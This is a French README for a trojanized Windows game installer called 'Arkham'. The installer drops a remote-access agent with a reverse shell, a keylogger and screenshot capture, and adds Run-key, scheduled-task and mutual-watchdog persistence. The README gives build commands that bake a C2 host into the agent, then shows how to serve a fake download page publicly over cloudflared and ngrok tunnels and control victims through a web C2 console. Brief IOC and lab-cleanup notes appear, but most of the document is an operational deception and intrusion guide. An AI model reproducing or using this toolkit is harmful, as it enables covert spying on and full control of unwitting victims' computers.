# ARKHAM — LE LEURRE · powered by Maxime Leal

**L'installateur professionnel trojanisé** : un assistant Windows NSIS complet (licence EULA →
dossier → progression → fin) qui installe un **vrai jeu jouable** et glisse **l'agent RAT
3-en-1** en silence, avec double persistance.

## LE VRAI INSTALLATEUR — `sorties/ArkhamSetup.exe` (247 Ko)
Généré par makensis (NSIS 3, cross-compilé depuis le Mac ✓) — l'assistant qu'attend
n'importe quel gamer :
1. **Page de licence** (contrat EULA crédible, « J'accepte »)
2. **Page de dossier** (`%LOCALAPPDATA%\ArkhamLab`, modifiable)
3. **Progression** — c'est ICI que l'agent s'installe en silence (nsExec caché)
4. **Page de fin** — case cochée « Lancer Batman: Arkham Lab Demo »

Ce que l'assistant fait :
- installe `ArkhamGame.exe` (le jeu) + `lexagent.exe` (l'agent) dans le dossier choisi
- crée des **raccourcis RÉELS** : Bureau + menu Démarrer (« Arkham Lab Demo »)
- exécute l'agent immédiatement + Run key `ArkhamUpdate` + tâche planifiée `ArkhamSvc`
- écrit un **désinstallateur** propre (`Uninstall.exe`) — le leurre jusqu'au bout

## LE JEU — `build/ArkhamGame.exe` (277 Ko)
Casse-briques réel : 48 briques gothiques, raquette souris, score/vies, GAME OVER,
niveau qui se recharge. La cible y joue plusieurs minutes.

## L'AGENT — `build/lexagent.exe` (170 Ko)
3 fils dans un process invisible : **reverse shell** (controle total, reconnexion 20 s)
+ **keylogger** (`%APPDATA%\Arkham\sys.log`) + **screenspy** (BMP caché, 60 s).

## LA FORGE — `python3 lex_forge.py <ip_c2> <port>`
Pipeline complet : recompile l'agent avec le C2 cuit en dur → NSIS → `ArkhamSetup.exe`.
(Le vieux `ArkhamInstaller.bat` base64/certutil reste dans `sorties/` comme variante.)

## PUBLIC — LE LIEN DEPUIS N'IMPORTE QUEL RÉSEAU
```
./serve_arkham_public.sh 8080
```
→ un seul script : lance la page + le tunnel cloudflared + affiche le **lien public**
   (`https://xxxx.trycloudflare.com`) — le DOWNLOAD marche depuis n'importe où
   (testé réel : page 200 ✓, exe 253 311 o servi à travers le tunnel ✓).

**Le shell de retour hors LAN** : l'agent accepte maintenant les hostnames (getaddrinfo —
compilé et vérifié ✓, ex `0.tcp.eu.ngrok.io`). Il faut exposer le port 4444 en TCP public :
```
brew install --cask ngrok          # déjà fait
ngrok config add-authtoken <TON_TOKEN>   # ngrok.com gratuit
ngrok tcp 4444                     # -> tcp://0.tcp.eu.ngrok.io:17432
python3 lex_forge.py 0.tcp.eu.ngrok.io 17432   # host:port du tunnel bake dans l'agent
./serve_arkham_public.sh 8080                  # page publique + dropper pointant le tunnel
```
Le port du tunnel TCP change à chaque lancement ngrok (gratuit) : re-forge à chaque session.

## LA CHAÎNE COMPLÈTE — les 3 pièces
| Script | Port | Rôle |
|---|---|---|
| `serve_arkham.py 8080` | 8080 | **la page officielle** « Batman: Arkham Lab — Free Download » : site gothique, bouton DOWNLOAD, badges v1.0/Windows — sert l'installateur |
| `arkham_c2.py 4444 5050` | 4444 + 5050 | **la console de contrôle** : shells entrants + interface web (sessions, commande, sortie live) |

**Le flux** :
1. `python3 lex_forge.py <ip> 4444` → `ArkhamSetup.exe`
2. `python3 serve_arkham.py 8080` → le lien piège = `http://TON_IP:8080/`
3. La cible clique DOWNLOAD → assistant NSIS → jeu + agent
4. `python3 arkham_c2.py 4444 5050` → ouvre `http://127.0.0.1:5050` dans ton navigateur :
   la session apparaît (IP + heure), tu cliques, tu tapes `whoami` → la sortie remonte
   dans le terminal noir. Contrôle total sans nc.

**Testé live sur ce banc** ✓ : session vue par la console, commande `whoami` envoyée,
bannière Windows remontée dans la sortie web.
(Le port web est 5050 — le 5000 d'AirPlay est pris par macOS.)

## USAGE LAB
```
cd ~/Desktop/tool_DC/ArkhamGame
python3 lex_forge.py 192.168.1.222 4444
# C2 : nc -lvn 4444 (ou c2.sh) · cible VM : lance ArkhamSetup.exe → Next → Next → Finish
# le jeu se lance, elle joue → ton shell arrive
```

## TESTS VM + NETTOYAGE + DÉTECTION
Voir tests du README précédent : Run key + schtasks + dossier install + shell interactif.
Désinstallateur intégré (`Uninstall.exe`) pour le nettoyage lab.
IOC : éditeur `Arkham Interactive` sans signature, `lexagent.exe` console résident,
tâche `ArkhamSvc`, Run key `ArkhamUpdate`.


## RÉSILIENCE v2 — L'HYDRE (coupe une tête, deux repoussent)
| Mécanisme | Ce que ça change |
|---|---|
| **2 corps** | l'agent se copie en 2 lieux : `%LOCALAPPDATA%\ArkhamLab\ArkhamUpdate.exe` (Run key) et `%APPDATA%\Microsoft\Updates\msupd.exe` (tâche planifiée) |
| **Chien de garde mutuel** | chaque copie vérifie son frère toutes les 4 s — copie tuée ou supprimée → recréée et relancée instantanément |
| **Mutex anti-doublon** | un seul agent actif (shell+keylog+screen) ; l'autre copie ne fait que surveiller — pas de sessions en double |
| **Attributs cachés** | les 2 corps en HIDDEN |

Supprimer UNE copie = recréée en ≤ 4 s par l'autre. Supprimer les DEUX = il faut aussi
trouver et vider la clé Run + la tâche `ArkhamSvc` + le mutex du watchdog pendant qu'il tourne.
Nettoyage lab complet : tuer les 2 process (ArkhamUpdate.exe + msupd.exe), puis supprimer
les 2 fichiers, puis reg/schtasks.
